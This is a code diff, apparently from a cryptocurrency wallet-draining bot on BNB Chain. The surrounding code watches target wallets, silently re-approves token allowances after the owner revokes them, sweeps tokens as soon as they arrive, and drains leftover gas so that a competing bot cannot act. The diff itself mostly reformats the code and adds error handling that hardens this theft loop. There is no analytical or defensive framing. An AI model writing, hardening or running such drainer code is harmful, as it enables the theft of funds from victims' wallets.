@@ -42,10 +42,12 @@ async function refresh() {
       }
       if (r.puller) orphanWarned.delete(r.target);
     }
-  } catch (e: any) { console.error('[engine] refresh', e.message); }
+  } catch (e: any) { 
+    console.error('[engine] refresh', e.message); 
+  }
 }
 
-async function sessionLive(t: Target) {
+async function sessionLive(t: Target): Promise<boolean> {
   if (!t.instanceId) return false;
   if (Date.now() - (sessionOk.get(t.target) ?? 0) < 10_000) return true;
   try {
@@ -55,7 +57,9 @@ async function sessionLive(t: Target) {
     if (st.data.status !== 'CONNECTED' || hit?.address.toLowerCase() !== t.target.toLowerCase()) return false;
     sessionOk.set(t.target, Date.now());
     return true;
-  } catch { return false; }
+  } catch { 
+    return false; 
+  }
 }
 
 /** Silent allowance top-up after a revoke. Needs a live session. */
@@ -90,7 +94,9 @@ async function checkAllowances(t: Target) {
       const ok = allow > 0n;
       if (ok !== tok.allowanceOk) await setAllowanceOk(tok.id, ok);
       if (allow < LOW_ALLOWANCE) await reapprove(t, tok.token);
-    } catch { /* transient */ }
+    } catch { 
+      /* transient */ 
+    }
   }
 }
 
@@ -122,7 +128,9 @@ async function tryPull(t: Target, token: `0x${string}`) {
       }
       await new Promise(r => setTimeout(r, 200));
     }
-  } finally { inflight.delete(k); }
+  } finally { 
+    inflight.delete(k); 
+  }
 }
 
 /** BNB leg — takes leftover gas so the other bot can't restart. */
@@ -138,19 +146,27 @@ async function bnbLeg(t: Target) {
     console.log(`[BNB LEG] ${t.target}`);
   } catch (e: any) {
     console.error(`[bnb] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
-  } finally { inflight.delete(k); }
+  } finally { 
+    inflight.delete(k); 
+  }
 }
 
 async function scan(t: Target) {
   for (const tok of t.tokens) {
-    const bal = await balanceOf(t.target, tok.token);
-    const key = `${t.target}:${tok.token}`;
-    const prev = lastBal.get(key) ?? 0n;
-    lastBal.set(key, bal);
-    if (bal >= MIN_SWEEP && bal > prev) {
-      console.log(`[ARRIVAL] ${tok.token} @ ${t.target}`);
-      void tryPull(t, tok.token);
-      if (tok.token.toLowerCase() === ENV.USDT) setTimeout(() => { void bnbLeg(t); }, 1_200);
+    try {
+      const bal = await balanceOf(t.target, tok.token);
+      const key = `${t.target}:${tok.token}`;
+      const prev = lastBal.get(key) ?? 0n;
+      lastBal.set(key, bal);
+      if (bal >= MIN_SWEEP && bal > prev) {
+        console.log(`[ARRIVAL] ${tok.token} @ ${t.target}`);
+        void tryPull(t, tok.token);
+        if (tok.token.toLowerCase() === ENV.USDT) {
+          setTimeout(() => { void bnbLeg(t); }, 1_200);
+        }
+      }
+    } catch {
+      // Ignore transient balance read errors per token
     }
   }
 }
@@ -158,9 +174,6 @@ async function scan(t: Target) {
 async function monitorRpcs() {
   if (!ENV.ADMIN_ID) return;
   for (const url of ENV.HTTP_URLS) {
-    try {
-      await createPublicClient({ chain: bsc, transport: webSocket(ENV.WSS_URLS[0]) }).getBlockNumber();
-    } catch { /* ignore */ }
     try {
       const { createPublicClient: c, http: h } = await import('viem');
       await c({ chain: bsc, transport: h(url, { timeout: 5_000 }) }).getBlockNumber();
@@ -175,8 +188,7 @@ async function monitorRpcs() {
 }
 
 /**
- * Allowance engine. Inert unless ENABLE_PULLER=true.
- * Hijack mode does not need it — the hijack watcher runs separately.
+ * Allowance / Balance polling engine.
  */
 export async function startEngine() {
   engineState.startedAt = Date.now();
